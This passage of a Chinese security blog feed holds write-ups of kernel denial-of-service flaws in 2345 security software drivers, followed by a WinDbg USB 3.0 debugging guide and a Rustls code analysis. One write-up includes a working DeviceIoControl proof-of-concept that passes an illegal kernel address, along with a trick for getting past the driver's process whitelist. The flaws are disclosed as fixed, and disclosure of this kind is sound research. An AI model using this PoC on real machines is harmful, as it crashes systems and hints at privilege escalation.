title="结语"></a>结语</h1><p>这个漏洞算是前一个的延申，依然是应用层传入内容中包括内存地址，也加入了内存合法性验证代码，但是却没什么用，并没有验证到要访问的内存处的合法性，这个疏漏导致了漏洞的产生。</p> <p>更好的验证内存合法性的函数应该使用<code>ProbeForRead(p, len, x)</code>，可以验证一个范围内内存的合法性，更加严谨，能更好的避免漏洞的产生。</p> <p>稍微总结一下，应用层传入内容结构越复杂，越容易出现问题。这个漏洞出现的位置，本来应该是2345接口协议验证的代码，是为了增加安全性的，却不想成为了安全性问题的原因。</p> <p>该系列后续会继续分析其他原因引起的漏洞，如有兴趣，敬请期待！</p> <p>转载请注明出处：<a href="https://anhkgg.github.io/vul-2345-2/">https://anhkgg.github.io/vul-2345-2/</a></p> <p><strong>参考</strong></p> <ol> <li><a href="https://www.cnblogs.com/Ox9A82/p/5571217.html" target="_blank" rel="noopener">如何验证一个地址可否使用—— MmIsAddressValid函数分析</a></li> <li><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/ntddk/nf-ntddk-mmisaddressvalid" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/ntddk/nf-ntddk-mmisaddressvalid</a></li> </ol> ]]></content>          <summary type="html">            &lt;h1 id=&quot;漏洞概述&quot;&gt;&lt;a href=&quot;#漏洞概述&quot; class=&quot;headerlink&quot; title=&quot;漏洞概述&quot;&gt;&lt;/a&gt;漏洞概述&lt;/h1&gt;&lt;ul&gt; &lt;li&gt;软件网址：&lt;a href=&quot;http://safe.2345.cc/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://safe.2345.cc/&lt;/a&gt;&lt;/li&gt; &lt;li&gt;版本：v3.7 X64&lt;/li&gt; &lt;/ul&gt; &lt;p&gt;2345安全软件的驱动2345BdPcSafe.sys在ioctl(0x002220E4)接口处理中，对输入数据校验不严格，可构造数据中包含非法地址导致访问违例，然后bsod拒绝服务。&lt;/p&gt;          </summary>            <category term="vul" scheme="https://anhkgg.github.io/categories/vul/"/>                 <category term="vul" scheme="https://anhkgg.github.io/tags/vul/"/>            <category term="exploit" scheme="https://anhkgg.github.io/tags/exploit/"/>            <category term="fuzz" scheme="https://anhkgg.github.io/tags/fuzz/"/>        </entry>      <entry>     <title>2345内核拒绝服务漏洞（1）</title>     <link href="https://anhkgg.github.io/vul-2345-1/"/>     <id>https://anhkgg.github.io/vul-2345-1/</id>     <published>2018-07-08T03:15:39.000Z</published>     <updated>2018-07-08T03:17:28.491Z</updated>          <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>已经快2个月了吧，已经忘了是什么原因突然搞起了驱动漏洞，反正就是很有兴致地想挖掘一下驱动漏洞。</p> <p>在网上了解了基本的驱动漏洞挖掘方法，主要是通过ioctl接口进行挖掘，已经有很多相关fuzz工具了，比如<a href="https://github.com/N3mes1s/ioctlbf" target="_blank" rel="noopener">ioctlbf</a>、<a href="https://github.com/k0keoyo/kDriver-Fuzzer" target="_blank" rel="noopener">kDriver-Fuzzer</a>等等。</p> <p>kDriver-Fuzzer的作者k0keoyo在2017年收获了100多个CVE，很牛逼啊，这个已经2018年了，再来挖此种类型的驱动是不是已经晚了啊，心中苦涩啊。</p> <p>不过毕竟也写了几年驱动程序了，不搞搞怎么也说不过去啊，所以开始干！</p> <a id="more"></a> <p>初学者嘛，还是找软柿子捏捏，什么微软、卡巴、小红伞、360、管家先还是别想了，很巧的知道了2345安全软件（此处想笑，毕竟为我贡献了不少…），先啥也不管，IDA一番…</p> <p>很不幸的，没多久2345就被我弄翻了，嗯，听说该公司年代也挺久了，咋这么…</p> <p>经过俩周手工和工具的连番蹂躏，发现2345安全软件驱动共10多个内核拒绝服务漏洞（某些也许可提权），也第一次感受到了拿CVE的感觉（其实怎么感觉都有点waterwater的）…</p> <p>好，前言胡扯差不多就到这里了，本系列将拿2345中几个典型的原因造成的安全漏洞进行一番分析，希望对和我一样的初学者有一定帮助。</p> <p>哦，当然，在连番联系2345客服催促之后，2345终于修复了所有漏洞，所以我才等到这个时候分享文章，分析一些细节应该对他们没什么影响了吧（不过，我可没有所有的都重新验证一遍，申明一下，大家不要拿来干坏事，出事了我概不负责！）</p> <h1 id="漏洞概况"><a href="#漏洞概况" class="headerlink" title="漏洞概况"></a>漏洞概况</h1><ul> <li>软件网址：<a href="http://safe.2345.cc/" target="_blank" rel="noopener">http://safe.2345.cc/</a></li> <li>版本：v3.7 X86</li> </ul> <p>2345安全软件的驱动2345NetFirewall.sys在ioctl(0x00222014)接口处理中，对输入数据校验不严格，可构造数据中包含非法地址导致访问违例，然后bsod拒绝服务。</p> <h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>在IRP_MJ_DEVICE_CONTROL处理函数中，对0x222014接口进行处理时如下所示：</p> <p><img src="http://wx2.sinaimg.cn/mw690/006mu4nKly1ft1gtchr61j30cl076jrb.jpg" alt="img"></p> <p><code>InputBuf</code>是应用层传入的输入缓存内容，校验<code>InputBuf</code>是否为空，长度是否超过8字节，然后在<code>memcpy</code>位置直接取<code>InputBuf</code>第一个字段(0偏移)作为目标地址拷贝内容进去，这里未校验第一个字段值作为内存地址的合法性。</p> <p>看到这里是不是有什么邪恶的想法了，把该字段置0，那么<code>memcpy(0, xx, xx)</code>不就bsod了。嗯，有点想多了，2345还是受过一些伤害做过一些自我修复的。</p> <p>看下面，该段代码有异常处理保护，so，0地址bsod不成了（确认该处在3.6版本时被人法克了的，所以补了一下）。</p> <p><img src="http://wx4.sinaimg.cn/mw690/006mu4nKly1ft1h1f0t5yj30jt05274h.jpg" alt="img"></p> <p>既然0不行，那么其他地址还是可以的嘛，比如某些内核地址0x80000000，或者nt!HalDispatchTable（某些提权方式使用的地址）。</p> <p>用下面的poc代码尝试了一下，bsod！</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ctlcode = 0x222014;</span><br><span class="line">NETFW_IOCTL_222014 buf_222014 = &#123;0&#125;;</span><br><span class="line">buf_222014.size = 1;</span><br><span class="line">buf_222014.ptr = (DWORD*)0x80000000; //非法内核地址</span><br><span class="line">if(!DeviceIoControl(h, ctlcode, &amp;buf_222014, sizeof(NETFW_IOCTL_222014), &amp;buf_222014, sizeof(NETFW_IOCTL_222014), &amp;BytesReturned, NULL)) &#123;</span><br><span class="line"> printf(&quot;[-] DeviceIoControl %x error: %d\n&quot;, ctlcode, GetLastError());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">kd&gt; dd 80000000</span><br><span class="line">80000000  ???????? ???????? ???????? ????????</span><br><span class="line">80000010  ???????? ???????? ???????? ????????</span><br></pre></td></tr></table></figure> <p>至此，该内核拒绝服务漏洞验证成功，替换未其他内核地址还是有希望提权的，这里不在深入研究。</p> <h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>看完整篇，其实知道该漏洞真的很明显，很弱B是吧。但是基于某些原因（门槛？漏洞价值？），内核驱动这方面受到的关注较少，所以被虐的少了，开发人员重视程度也不够，所以对于参数的校验上就没那么认真严谨了！所以留下了这种弱X的洞洞被我捡漏。</p> <p>当然，前面提到2345在3.6版本中已经被人干过，所以还是做了一定的工作的，除了加入了异常保护代码，对于ioctl接口调用也加入了一定的限制和校验。所以poc不是直接就调用接口就成功触发bsod的，而做了一定的前期工作来应对2345做的限制和保护。</p> <p><strong>这里不是重点，大致讲一下。在IRP_MJ_DEVICE_CONTROL处理函数中，首先会校验调用接口的进程是否在缓存的白名单进程中，但是呢2345又提供了ioctl接口来添加进程到白名单中，对该接口也没做什么其他的校验，所以很随意的调用成功，把自己的poc进程加入了白名单中，然后再调用漏洞接口触发bsod，完成！</strong></p> <p>另外，如果有兴趣也研究一些驱动此类漏洞的，并且对驱动编程不是很了解的，建议可以先简单学习一下简单驱动编写模板、ring3和ring0通信方式、驱动设备等等内容，推荐可以看看《Windows驱动开发技术详解》相关章节内容。</p> <p>该系列后续会继续分析其他原因引起的漏洞，如有兴趣，敬请期待！</p> <p>转载请注明出处：<a href="https://anhkgg.github.io/vul-2345-1/">https://anhkgg.github.io/vul-2345-1/</a></p> ]]></content>          <summary type="html">            &lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;已经快2个月了吧，已经忘了是什么原因突然搞起了驱动漏洞，反正就是很有兴致地想挖掘一下驱动漏洞。&lt;/p&gt; &lt;p&gt;在网上了解了基本的驱动漏洞挖掘方法，主要是通过ioctl接口进行挖掘，已经有很多相关fuzz工具了，比如&lt;a href=&quot;https://github.com/N3mes1s/ioctlbf&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;ioctlbf&lt;/a&gt;、&lt;a href=&quot;https://github.com/k0keoyo/kDriver-Fuzzer&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;kDriver-Fuzzer&lt;/a&gt;等等。&lt;/p&gt; &lt;p&gt;kDriver-Fuzzer的作者k0keoyo在2017年收获了100多个CVE，很牛逼啊，这个已经2018年了，再来挖此种类型的驱动是不是已经晚了啊，心中苦涩啊。&lt;/p&gt; &lt;p&gt;不过毕竟也写了几年驱动程序了，不搞搞怎么也说不过去啊，所以开始干！&lt;/p&gt;          </summary>            <category term="vul" scheme="https://anhkgg.github.io/categories/vul/"/>                 <category term="vul" scheme="https://anhkgg.github.io/tags/vul/"/>            <category term="exploit" scheme="https://anhkgg.github.io/tags/exploit/"/>            <category term="fuzz" scheme="https://anhkgg.github.io/tags/fuzz/"/>        </entry>      <entry>     <title>Windbg USB3.0双机调试</title>     <link href="https://anhkgg.github.io/windbg-usb3-dbg-win10/"/>     <id>https://anhkgg.github.io/windbg-usb3-dbg-win10/</id>     <published>2018-03-23T06:31:36.000Z</published>     <updated>2018-03-23T06:55:19.751Z</updated>          <content type="html"><![CDATA[<h1 id="配置需求"><a href="#配置需求" class="headerlink" title="配置需求"></a>配置需求</h1><p>1.目标主机有USB3.0 xHCI主机控制器，支持调试<br>2.host主机支持USB3.0 xHCI主机控制器(使用UsbView查看)<br>3.USB 3.0 调试线(<a href="https://www.datapro.net/products/usb-3-0-super-speed-a-a-debugging-cable.html" target="_blank" rel="noopener">国外购买地址</a>（可以用普通USB3.0 公对公线改造，剪掉红绿百三根线）</p> <blockquote> <p>先从淘宝买一根USB 3的A对A连线，有时也称公对公连线，很便宜。这根线需要加工一下才可以支持调试，加工的方法是选取线的某个位置，剥开外皮，然后把其中的红绿白三根线剪断，然后包上就可以了。USB 3电缆的线是有固定颜色的，如图3所示，<br>其中SDP是Shielded Differential Pair的缩写，即屏蔽起来的差分信号线，是USB 3.0的数据线，UTP是Unshielded Twisted Pair的缩写，即未屏蔽的双绞线，是USB1/2使用的数据线，所谓的D+，D-。要做的加工其实就是把2.0的三根弦剪断。剥开后，很容易找到红绿白三根，胆大心细，下剪子吧:-)。</p> </blockquote> <p>4.两台主机系统必须是Win8以上</p> <blockquote> <p>On the host computer, an xHCI (USB 3.0) host controller<br>On the target computer, an xHCI (USB 3.0) host controller that supports debugging</p> </blockquote> <a id="more"></a> <h1 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h1><p><strong>在目标主机配置调试模式。</strong></p> <p>命令：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bcdedit /debug on</span><br><span class="line">bcdedit /dbgsettings usb targetname:TargetName</span><br><span class="line">//如果目标主机有多个xHCI主机控制器，则需要配置需要使用的，b.d.f在usbview中可以看到</span><br><span class="line">bcdedit /set &quot;&#123;dbgsettings&#125;&quot; busparams b.d.f</span><br><span class="line">//重启主机</span><br></pre></td></tr></table></figure> <p>使用msconfig配置，引导，高级模式，勾选调试，选择USB模式，USB目标名：usbdbg</p> <p><strong>host主机配置。</strong></p> <p>第一次配置，如果host是X64，开启X64 windbg，如果是x86，选择开启x86 windbg，需要管理员权限运行。</p> <p>Ctrl+K，选择USB，填入目标主机配置的名字（usbdbg），确认，等待。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Microsoft (R) Windows Debugger Version 10.0.14321.1024 AMD64</span><br><span class="line">Copyright (c) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">Using USB for debugging</span><br><span class="line">Waiting to reconnect...</span><br><span class="line">USB: Write opened</span><br></pre></td></tr></table></figure> <p>当将USB调试线插入host主机接口时，会自动安装相关驱动（usb2dbg等，管理员，位数等要求的原因）。</p> <p>然后出现<code>USB: Write opened</code>表示与目标主机连接成功。</p> <p>按下Ctrl+break，即可开始调试目标主机了</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">Connected to Windows 10 16299 x64 target at (Tue Dec 12 09:47:18.535 2017 (UTC + 8:00)), ptr64 TRUE</span><br><span class="line">Kernel Debugger connection established.</span><br><span class="line"></span><br><span class="line">************* Symbol Path validation summary **************</span><br><span class="line">Response                         Time (ms)     Location</span><br><span class="line">Deferred                                       SRV*e:\symbols* http://msdl.microsoft.com/download/symbols</span><br><span class="line">Deferred                                       SRV*e:\symbols*http://msdl.microsoft.com/download/symbols</span><br><span class="line">Symbol search path is: SRV*e:\symbols* http://msdl.microsoft.com/download/symbols;SRV*e:\symbols*http://msdl.microsoft.com/download/symbols</span><br><span class="line">Executable search path is: </span><br><span class="line">Windows 10 Kernel Version 16299 MP (4 procs) Free x64</span><br><span class="line">Product: WinNt, suite: TerminalServer SingleUserTS</span><br><span class="line">Built by: 16299.15.amd64fre.rs3_release.170928-1534</span><br><span class="line">Machine Name:</span><br><span class="line">Kernel base = 0xfffff800`9e21d000 PsLoadedModuleList = 0xfffff800`9e57efb0</span><br><span class="line">Debug session time: Tue Dec 12 09:47:12.452 2017 (UTC + 8:00)</span><br><span class="line">System Uptime: 3 days 17:11:46.032</span><br><span class="line">WARNING: Whitespace at end of path element</span><br><span class="line"></span><br><span class="line">************* Symbol Path validation summary **************</span><br><span class="line">Response                         Time (ms)     Location</span><br><span class="line">Deferred                                       SRV*e:\symbols* http://msdl.microsoft.com/download/symbols</span><br><span class="line">Deferred                                       SRV*e:\symbols*http://msdl.microsoft.com/download/symbols</span><br><span class="line">Break instruction exception - code 80000003 (first chance)</span><br><span class="line">*******************************************************************************</span><br><span class="line">*                                                                             *</span><br><span class="line">*   You are seeing this message because you pressed either                    *</span><br><span class="line">*       CTRL+C (if you run console kernel debugger) or,                       *</span><br><span class="line">*       CTRL+BREAK (if you run GUI kernel debugger),                          *</span><br><span class="line">*   on your debugger machine&apos;s keyboard.                                      *</span><br><span class="line">*                                                                             *</span><br><span class="line">*                   THIS IS NOT A BUG OR A SYSTEM CRASH                       *</span><br><span class="line">*                                                                             *</span><br><span class="line">* If you did not intend to break into the debugger, press the &quot;g&quot; key, then   *</span><br><span class="line">* press the &quot;Enter&quot; key now.  This message might immediately reappear.  If it *</span><br><span class="line">* does, press &quot;g&quot; and &quot;Enter&quot; again.                                          *</span><br><span class="line">*                                                                             *</span><br><span class="line">*******************************************************************************</span><br><span class="line">nt!DbgBreakPointWithStatus:</span><br><span class="line">fffff800`9e386c60 cc              int     3</span><br></pre></td></tr></table></figure> <p>连接成功，设备管理中出现<code>USB Debug Connection Device</code>。</p> <p>参考：</p> <ol> <li><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/setting-up-a-usb-3-0-debug-cable-connection" target="_blank" rel="noopener">setting-up-a-usb-3-0-debug-cable-connection</a></li> <li><a href="http://en.community.dell.com/techcenter/b/techcenter/archive/2014/09/30/usb3-kernel-debugging-with-dell-poweredge-13g-servers" target="_blank" rel="noopener">USB3 Kernel Debugging with Dell PowerEdge 13G Servers</a></li> <li><a href="http://blog.techlab-xe.net/archives/1961" target="_blank" rel="noopener">http://blog.techlab-xe.net/archives/1961</a></li> <li><a href="http://advdbg.org/blogs/advdbg_system/articles/5954.aspx" target="_blank" rel="noopener">使用USB3.0调试Windows 8</a></li> </ol> ]]></content>          <summary type="html">            &lt;h1 id=&quot;配置需求&quot;&gt;&lt;a href=&quot;#配置需求&quot; class=&quot;headerlink&quot; title=&quot;配置需求&quot;&gt;&lt;/a&gt;配置需求&lt;/h1&gt;&lt;p&gt;1.目标主机有USB3.0 xHCI主机控制器，支持调试&lt;br&gt;2.host主机支持USB3.0 xHCI主机控制器(使用UsbView查看)&lt;br&gt;3.USB 3.0 调试线(&lt;a href=&quot;https://www.datapro.net/products/usb-3-0-super-speed-a-a-debugging-cable.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;国外购买地址&lt;/a&gt;（可以用普通USB3.0 公对公线改造，剪掉红绿百三根线）&lt;/p&gt; &lt;blockquote&gt; &lt;p&gt;先从淘宝买一根USB 3的A对A连线，有时也称公对公连线，很便宜。这根线需要加工一下才可以支持调试，加工的方法是选取线的某个位置，剥开外皮，然后把其中的红绿白三根线剪断，然后包上就可以了。USB 3电缆的线是有固定颜色的，如图3所示，&lt;br&gt;其中SDP是Shielded Differential Pair的缩写，即屏蔽起来的差分信号线，是USB 3.0的数据线，UTP是Unshielded Twisted Pair的缩写，即未屏蔽的双绞线，是USB1/2使用的数据线，所谓的D+，D-。要做的加工其实就是把2.0的三根弦剪断。剥开后，很容易找到红绿白三根，胆大心细，下剪子吧:-)。&lt;/p&gt; &lt;/blockquote&gt; &lt;p&gt;4.两台主机系统必须是Win8以上&lt;/p&gt; &lt;blockquote&gt; &lt;p&gt;On the host computer, an xHCI (USB 3.0) host controller&lt;br&gt;On the target computer, an xHCI (USB 3.0) host controller that supports debugging&lt;/p&gt; &lt;/blockquote&gt;          </summary>            <category term="debug" scheme="https://anhkgg.github.io/categories/debug/"/>                 <category term="windbg" scheme="https://anhkgg.github.io/tags/windbg/"/>            <category term="usb3" scheme="https://anhkgg.github.io/tags/usb3/"/>            <category term="debug" scheme="https://anhkgg.github.io/tags/debug/"/>            <category term="win10" scheme="https://anhkgg.github.io/tags/win10/"/>        </entry>      <entry>     <title>Rustls之源码分析总结（一）</title>     <link href="https://anhkgg.github.io/rustls-source-code-analyze/"/>     <id>https://anhkgg.github.io/rustls-source-code-analyze/</id>     <published>2017-11-17T05:19:50.000Z</published>     <updated>2017-11-17T05:35:17.810Z</updated>          <content type="html"><![CDATA[<ul> <li>作者：<strong>anhkgg</strong> </li> <li>日期：<strong>2017-11-16</strong></li> </ul> <p>rustls已经支持tls1.3，但是测试分析中使用的tls1.2，所以后面分析主要集中在tls1.2。</p> <p>主要分析的源码内容：</p> <ol> <li>client和server的握手协议流程</li> <li>rustls是如何进行数据传输的</li> <li>数据传输是如何加密解密的</li> </ol> <a id="more"></a> <h2 id="源码结构"><a href="#源码结构" class="headerlink" title="源码结构"></a>源码结构</h2><p><strong>分为client和server两部分</strong></p> <h3 id="公共接口"><a href="#公共接口" class="headerlink" title="公共接口"></a>公共接口</h3><p><strong>session.rs</strong>定义了SessionCommon，包括了数据传输、数据加密、包处理相关接口。</p> <p><strong>主要字段</strong></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pub struct SessionCommon &#123;</span><br><span class="line">    pub negotiated_version: Option&lt;ProtocolVersion&gt;, //协商好的协议版本</span><br><span class="line">    pub is_client: bool, //是客户端true，是服务端false</span><br><span class="line">    message_encrypter: Box&lt;MessageEncrypter&gt;, //数据加密接口</span><br><span class="line">    message_decrypter: Box&lt;MessageDecrypter&gt;, //数据解密接口</span><br><span class="line">    key_schedule: Option&lt;KeySchedule&gt;,</span><br><span class="line">    suite: Option&lt;&amp;&apos;static SupportedCipherSuite&gt;,</span><br><span class="line">    write_seq: u64,</span><br><span class="line">    read_seq: u64,</span><br><span class="line">    peer_eof: bool,</span><br><span class="line">    pub peer_encrypting: bool,</span><br><span class="line">    pub we_encrypting: bool,</span><br><span class="line">    pub traffic: bool, // 默认false，握手完成字段为true</span><br><span class="line">    pub want_write_key_update: bool,</span><br><span class="line">    pub message_deframer: MessageDeframer, //消息帧处理对象，保存所有Message包</span><br><span class="line">    pub handshake_joiner: HandshakeJoiner,</span><br><span class="line">    pub message_fragmenter: MessageFragmenter,</span><br><span class="line">    received_plaintext: ChunkVecBuffer, //缓存接收到的数据明文</span><br><span class="line">    sendable_plaintext: ChunkVecBuffer,//缓存握手后需要传输的数据明文</span><br><span class="line">    pub sendable_tls: ChunkVecBuffer, //缓存握手数据包</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <p><strong>主要接口</strong></p> <table> <thead> <tr> <th>函数名</th> <th>说明 </th> </tr> </thead> <tbody> <tr> <td><code>read_tls</code></td> <td>接收底层连接数据 </td> </tr> <tr> <td><code>write_tls</code></td> <td>通过底层连接发送数据</td> </tr> <tr> <td><code>process_new_packets</code></td> <td>每次调用read_tls之后都需要调用该函数主动触发消息处理</td> </tr> <tr> <td><code>wants_read/wants_write</code></td> <td>是否有数据需要接收发送</td> </tr> <tr> <td><code>encrypt_outgoing</code></td> <td>加密要发送的数据，在握手完成之后需要</td> </tr> <tr> <td><code>decrypt_incoming</code></td> <td>解密要接收的数据，在握手完成之后需要</td> </tr> <tr> <td><code>send_msg_encrypt</code></td> <td>发送加密数据</td> </tr> <tr> <td><code>send_appdata_encrypt</code></td> <td>发送握手之后的数据，加密</td> </tr> <tr> <td><code>send_some_plaintext</code></td> <td>发送明文数据，握手之后会被加密发送</td> </tr> <tr> <td><code>start_traffic</code></td> <td>握手完成之后调用，设置传输标志，发送缓存的数据明文</td> </tr> <tr> <td><code>send_msg</code></td> <td>发送TLS消息，根据是否加密走不通发送方式</td> </tr> <tr> <td><code>take_received_plaintext</code></td> <td>握手完成之后，收到数据会被调用，参数已经是明文Message</td> </tr> <tr> <td><code>set_message_encrypter</code></td> <td>设置消息加密接口，<code>start_encryption_tls12</code>中调用</td> </tr> <tr> <td><code>set_message_decrypter</code></td> <td>设置消息解密接口，<code>start_encryption_tls12</code>中调用</td> </tr> <tr> <td><code>start_encryption_tls12</code></td> <td>TLS1.2设置加解密接口，在ExpectTLS12ServerDone::handle/ExpectTLS12ClientKX::handle调用</td> </tr> </tbody> </table> <p><strong>ciper.rs</strong>定义了加密解密的接口。</p> <p><code>MessageEncrypter</code>,<code>MessageDecrypter</code>，具体使用加解密方法在握手过程中ExpectTLS12ServerDone::handle/ExpectTLS12ClientKX::handle设置。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">//client端</span><br><span class="line">// 5e. Now commit secrets.</span><br><span class="line">let hashalg = sess.common.get_suite().get_hash();</span><br><span class="line">if st.handshake.using_ems &#123;</span><br><span class="line">    sess.secrets = Some(SessionSecrets::new_ems(&amp;st.handshake.randoms,</span><br><span class="line">                                                &amp;handshake_hash,</span><br><span class="line">                                                hashalg,</span><br><span class="line">                                                &amp;kxd.premaster_secret));</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    sess.secrets = Some(SessionSecrets::new(&amp;st.handshake.randoms,</span><br><span class="line">                                            hashalg,</span><br><span class="line">                                            &amp;kxd.premaster_secret));</span><br><span class="line">&#125;</span><br><span class="line">sess.start_encryption_tls12();</span><br><span class="line">//----------</span><br><span class="line">pub fn start_encryption_tls12(&amp;mut self, secrets: &amp;SessionSecrets) &#123;</span><br><span class="line">        let (dec, enc) = cipher::new_tls12(self.get_suite(), secrets);</span><br><span class="line">        self.message_encrypter = enc;</span><br><span class="line">        self.message_decrypter = dec;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure> <h3 id="client详解"><a href="#client详解" class="headerlink" title="client详解"></a>client详解</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">src/client/mod.rs 导出ClientSession接口，外部使用</span><br><span class="line">src/client/hs.rs tls协议中所有包处理，包括握手和传输</span><br></pre></td></tr></table></figure> <p><code>ClientSession</code>内部由<code>ClientSessionImpl</code>实现。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pub struct ClientSessionImpl &#123;</span><br><span class="line">    pub config: Arc&lt;ClientConfig&gt;, //保存client端的证书，密钥配置等信息</span><br><span class="line">    pub secrets: Option&lt;SessionSecrets&gt;, //保存握手后的会话密钥</span><br><span class="line">    pub alpn_protocol: Option&lt;String&gt;,</span><br><span class="line">    pub common: SessionCommon, // 完成具体消息传输、加解密等</span><br><span class="line">    pub error: Option&lt;TLSError&gt;,</span><br><span class="line">    pub state: Option&lt;Box&lt;hs::State + Send&gt;&gt;, // 保存握手过程中的交互状态，握手中处理对象都实现State接口</span><br><span class="line">    pub server_cert_chain: CertificatePayload, // 服务端证书链</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <p><strong>握手，准备第一个数据包</strong>。</p> <p><code>ClientSessionImpl::new</code>内部就会准备握手要发送的第一个数据包。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">cs.state = Some(hs::start_handshake(&amp;mut cs, hostname));</span><br><span class="line">//cs.state保存下一次将处理数据对象</span><br><span class="line">---&gt; //进入hs.rs</span><br><span class="line">InitialState::emit_initial_client_hello</span><br><span class="line">---&gt;</span><br><span class="line">emit_client_hello_for_retry</span><br><span class="line">---&gt; //构造发送的数据包</span><br><span class="line">let mut chp = HandshakeMessagePayload &#123;</span><br><span class="line">        typ: HandshakeType::ClientHello,</span><br><span class="line">        payload: HandshakePayload::ClientHello(ClientHelloPayload &#123;</span><br><span class="line">            client_version: ProtocolVersion::TLSv1_2,</span><br><span class="line">            random: Random::from_slice(&amp;handshake.randoms.client),</span><br><span class="line">            session_id: session_id,</span><br><span class="line">            cipher_suites: sess.get_cipher_suites(),</span><br><span class="line">            compression_methods: vec![Compression::Null],</span><br><span class="line">            extensions: exts,</span><br><span class="line">        &#125;),</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure> <p>然后，收到返回数据之后，会在<code>ClientSessionImpl::process_main_protocol</code>调用<code>state.handle</code>来处理收到的数据，然后返回新的state，用于下次处理，如此循环，知道握手完成。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">fn process_main_protocol(&amp;mut self, msg: Message) -&gt; Result&lt;(), TLSError&gt; &#123;</span><br><span class="line"> //检查消息是否合法</span><br><span class="line">    let state = self.state.take().unwrap();</span><br><span class="line">    